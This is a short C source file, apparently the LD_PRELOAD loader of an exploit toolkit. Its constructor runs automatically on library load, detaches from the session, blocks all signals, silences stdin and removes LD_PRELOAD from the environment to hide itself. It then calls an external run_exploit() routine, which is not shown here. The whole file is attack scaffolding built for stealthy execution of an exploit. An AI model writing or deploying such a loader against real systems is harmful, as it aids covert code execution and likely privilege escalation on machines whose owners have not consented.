#include "common.h"

extern int run_exploit(int argc, char** argv);

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  (void)setsid();
  int devnull = open("/dev/null", O_RDWR | O_CLOEXEC);
  if (devnull >= 0) {
    dup2(devnull, STDIN_FILENO);
    if (devnull > STDERR_FILENO) {
      close(devnull);
    }
  }
  sigset_t all;
  sigfillset(&all);
  (void)sigprocmask(SIG_BLOCK, &all, NULL);

  unsetenv("LD_PRELOAD");

  log_fd = PSELECT_ROUTE_NFDS + 55;
  dup2(STDOUT_FILENO, log_fd);

  char linkbuf[64];
  ssize_t linklen = readlink("/proc/self/fd/0", linkbuf, sizeof(linkbuf) - 1);
  if (linklen < 0) {
    linklen = 0;
  }
  linkbuf[linklen] = 0;
  pr_info("env: sid=%d pgid=%d fd0=%s\n", (int)getsid(0), (int)getpgid(0), linkbuf);

  char* argv[2] = {
      "preload.so",
      NULL,
  };

  pr_success("preload starting pid=%d\n", getpid());

  int rc = run_exploit(1, argv);
  ghostlock_boot_mark(rc);
  fflush(NULL);
  _exit(rc);
}
